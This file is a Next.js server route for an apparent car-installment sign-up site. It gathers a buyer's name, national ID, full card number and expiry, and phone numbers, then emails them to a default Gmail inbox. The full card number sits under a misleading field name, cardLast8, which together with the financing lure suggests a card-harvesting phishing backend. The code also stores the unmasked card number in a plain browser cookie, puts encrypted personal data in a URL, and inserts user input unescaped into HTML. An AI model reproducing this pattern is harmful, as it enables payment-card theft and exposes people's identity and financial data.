import { NextResponse } from "next/server"
import { Resend } from "resend"
import { cars } from "@/lib/data"
import { encryptPayload } from "@/lib/crypto"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { 
      fullName, 
      nin, 
      cardLast8, 
      cardExpiry, 
      phone1, 
      phone2, 
      hasPreviousInstallment, 
      selectedCarId, 
      selectedCar: carFromBody, 
      createdAt 
    } = body

    // 1. Resolve selected car
    const selectedCar = carFromBody || cars.find((car) => car.id === selectedCarId)

    // 2. Validate environment variables
    const resendApiKey = process.env.RESEND_API_KEY?.trim()
    const toEmail = process.env.EMAIL_TO?.trim() || "autodzaircontact@gmail.com"
    const fromEmail = process.env.EMAIL_FROM?.trim() || "onboarding@resend.dev"

    if (!resendApiKey) {
      console.error("RESEND_API_KEY is not defined in the environment.")
      return NextResponse.json(
        { success: false, message: "إعدادات البريد الإلكتروني غير مكتملة" },
        { status: 500 }
      )
    }

    // 3. Generate unique submission ID
    const submissionId = `SR-${Date.now().toString().slice(-6)}-${Math.floor(100 + Math.random() * 900)}`
    
    const submission = {
      id: submissionId,
      fullName,
      nin,
      cardLast8,
      cardExpiry,
      phone1,
      phone2: phone2 || "غير محدد",
      hasPreviousInstallment,
      selectedCar,
      createdAt: createdAt || new Date().toISOString(),
      status: "pending"
    }

    // 4. Secure Encrypted Payload for Admin Decryption
    const sensitiveData = JSON.stringify({
      id: submissionId,
      fullName,
      nin,
      cardLast8, // Contains the full 16-digit card number
      cardExpiry,
      phone1,
      phone2: phone2 || "غير محدد",
      hasPreviousInstallment,
      selectedCarId,
      selectedCar,
      createdAt: submission.createdAt
    })
    const encryptedPayload = encryptPayload(sensitiveData)

    // 5. Determine App Base URL dynamically
    const host = request.headers.get("host") || "showroom-auto-dzair.vercel.app"
    const protocol = host.includes("localhost") ? "http" : "https"
    const appUrl = `${protocol}://${host}`
    const secureDecryptLink = `${appUrl}/dashboard/registrations?secure_payload=${encodeURIComponent(encryptedPayload)}`

    // 6. Create Masked values for standard email body
    const maskedNin = nin.slice(0, 4) + " •••• •••• •••• " + nin.slice(-4)
    const maskedCard = "•••• •••• •••• " + cardLast8.slice(-4)
    const maskedPhone1 = phone1.slice(0, 4) + " ••• " + phone1.slice(-3)
    const maskedPhone2 = phone2 && phone2 !== "غير محدد" 
      ? (phone2.slice(0, 4) + " ••• " + phone2.slice(-3)) 
      : "غير محدد"

    // 7. Send email using Resend
    const resend = new Resend(resendApiKey)
    const dateFormatted = new Date(submission.createdAt).toLocaleString("ar-DZ", { timeZone: "Africa/Algiers" })

    const htmlContent = `
      <!DOCTYPE html>
      <html lang="ar" dir="rtl">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
          body {
            font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f8fafc;
            color: #1e293b;
            margin: 0;
            padding: 0;
            direction: rtl;
            text-align: right;
          }
          .email-container {
            max-width: 600px;
            margin: 30px auto;
            background: #ffffff;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05);
            border: 1px solid #e2e8f0;
          }
          .header-ribbon {
            height: 6px;
            background: linear-gradient(90deg, #1e3a8a 0%, #3b82f6 50%, #10b981 100%);
          }
          .header {
            background-color: #0f172a;
            color: #ffffff;
            padding: 30px 25px;
            text-align: center;
          }
          .header h1 {
            margin: 0;
            font-size: 24px;
            font-weight: 700;
          }
          .header p {
            margin: 6px 0 0 0;
            color: #94a3b8;
            font-size: 13px;
          }
          .content {
            padding: 30px 25px;
          }
          .status-container {
            text-align: left;
            margin-bottom: 20px;
          }
          .status-badge {
            display: inline-block;
            background-color: #eff6ff;
            color: #1e40af;
            padding: 6px 14px;
            border-radius: 9999px;
            font-size: 12px;
            font-weight: 700;
            border: 1px solid #bfdbfe;
          }
          .section-title {
            font-size: 16px;
            color: #1e3a8a;
            border-right: 4px solid #3b82f6;
            padding-right: 10px;
            margin-top: 25px;
            margin-bottom: 12px;
            font-weight: 700;
          }
          .info-table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
            background-color: #f8fafc;
            border-radius: 8px;
            border: 1px solid #e2e8f0;
          }
          .info-table td {
            padding: 12px 15px;
            border-bottom: 1px solid #e2e8f0;
            font-size: 14px;
          }
          .info-table tr:last-child td {
            border-bottom: none;
          }
          .info-table td.label {
            font-weight: 600;
            color: #64748b;
            width: 40%;
          }
          .info-table td.value {
            color: #0f172a;
            font-weight: 700;
          }
          .car-card {
            background-color: #f0fdf4;
            border: 1px solid #bbf7d0;
            border-radius: 12px;
            padding: 20px;
            margin-top: 15px;
          }
          .car-title {
            font-size: 18px;
            font-weight: bold;
            color: #166534;
            margin-top: 0;
            margin-bottom: 8px;
          }
          .secure-box {
            background-color: #fef2f2;
            border: 1px dashed #fecaca;
            border-radius: 12px;
            padding: 20px;
            margin-top: 30px;
            text-align: center;
          }
          .secure-title {
            font-size: 15px;
            font-weight: bold;
            color: #991b1b;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
          }
          .secure-desc {
            font-size: 12px;
            color: #7f1d1d;
            margin-bottom: 15px;
            line-height: 1.6;
          }
          .decrypt-btn {
            display: inline-block;
            background-color: #dc2626;
            color: #ffffff !important;
            padding: 10px 24px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: bold;
            font-size: 14px;
            border: none;
            box-shadow: 0 4px 6px -1px rgba(220, 38, 38, 0.1);
            transition: background-color 0.2s;
          }
          .decrypt-btn:hover {
            background-color: #b91c1c;
          }
          .footer {
            background-color: #f1f5f9;
            text-align: center;
            padding: 20px;
            font-size: 11px;
            color: #64748b;
            border-top: 1px solid #e2e8f0;
          }
        </style>
      </head>
      <body>
        <div class="email-container">
          <div class="header-ribbon"></div>
          <div class="header">
            <h1>Showroom Auto Dzair</h1>
            <p>طلب شراء سيارة بالتقسيط الميسّر - إشعار الإدارة</p>
          </div>
          <div class="content">
            <div class="status-container">
              <span class="status-badge">قيد الانتظار</span>
            </div>
            
            <div class="section-title">👤 تفاصيل العميل (النسخة العادية)</div>
            <table class="info-table">
              <tr>
                <td class="label">الاسم الكامل:</td>
                <td class="value">${submission.fullName}</td>
              </tr>
              <tr>
                <td class="label">رقم التعريف الوطني (NIN):</td>
                <td class="value" style="letter-spacing: 0.5px;">${maskedNin}</td>
              </tr>
              <tr>
                <td class="label">الهاتف الأول:</td>
                <td class="value" dir="ltr">${maskedPhone1}</td>
              </tr>
              <tr>
                <td class="label">الهاتف الثاني:</td>
                <td class="value" dir="ltr">${maskedPhone2}</td>
              </tr>
              <tr>
                <td class="label">شراء بالتقسيط سابق:</td>
                <td class="value">${submission.hasPreviousInstallment ? "نعم" : "لا"}</td>
              </tr>
            </table>

            <div class="section-title">💳 معلومات الدفع والضمان</div>
            <table class="info-table">
              <tr>
                <td class="label">رقم البطاقة الذهبية:</td>
                <td class="value" style="letter-spacing: 1px;">${maskedCard}</td>
              </tr>
              <tr>
                <td class="label">تاريخ انتهاء الصلاحية:</td>
                <td class="value">${submission.cardExpiry}</td>
              </tr>
            </table>

            <div class="section-title">🚗 تفاصيل السيارة المطلوبة</div>
            <div class="car-card">
              ${
                selectedCar 
                  ? `
                    <div class="car-title">${selectedCar.brand} ${selectedCar.model} (${selectedCar.year})</div>
                    <div style="font-size: 13px; color: #166534; margin-bottom: 6px;">
                      السعر الكلي: <strong>${new Intl.NumberFormat("ar-DZ").format(selectedCar.price)} دج</strong>
                    </div>
                    <div style="font-size: 14px; color: #166534; font-weight: bold;">
                      الأقساط: ${new Intl.NumberFormat("ar-DZ").format(selectedCar.monthlyPayment)} دج / شهر
                    </div>
                    `
                  : `<div class="car-title">لم يتم اختيار سيارة</div>`
              }
            </div>

            <!-- Lock Block for Secure decryption -->
            <div class="secure-box">
              <div class="secure-title">
                🔒 البيانات الحساسة مشفرة آمنة (AES-256)
              </div>
              <div class="secure-desc">
                لحماية خصوصية العميل ومنع تسرب البيانات عند اختراق البريد الإلكتروني، تم تشفير البيانات الكاملة (رقم التعريف ورقم البطاقة بالكامل). يمكنك عرضها بأمان بنقرة واحدة عبر لوحة التحكم الخاصة بك.
              </div>
              <a href="${secureDecryptLink}" target="_blank" class="decrypt-btn">
                🔓 عرض البيانات الكاملة الآمنة
              </a>
            </div>

            <div style="margin-top: 30px; font-size: 11px; color: #94a3b8; text-align: center;">
              الرقم المرجعي: ${submission.id} | تاريخ الإرسال: ${dateFormatted}
            </div>
          </div>
          <div class="footer">
            هذا البريد مؤمن تشفيرياً ومرسل تلقائياً من نظام Showroom Auto Dzair.<br>
            إن كود فك التشفير غير مخزن بالبريد نهائياً لضمان السرية المطلقة.
          </div>
        </div>
      </body>
      </html>
    `

    await resend.emails.send({
      from: fromEmail,
      to: toEmail,
      subject: `طلب تقسيط جديد (${submission.id}) - ${submission.fullName}`,
      html: htmlContent,
    })

    // 8. Construct response and set cookie
    const response = NextResponse.json({
      success: true,
      id: submissionId,
      message: "تم تسجيل بيانات العميل بنجاح وسيتم إرسال الإشعار"
    }, { status: 201 })

    response.cookies.set("last_submission", JSON.stringify(submission), {
      maxAge: 3600, // 1 hour
      path: "/",
      sameSite: "lax",
    })

    return response
  } catch (error: any) {
    console.error("[Resend Registration API Error]:", error)
    return NextResponse.json(
      { success: false, message: error.message || "حدث خطأ في التسجيل" },
      { status: 500 }
    )
  }
}
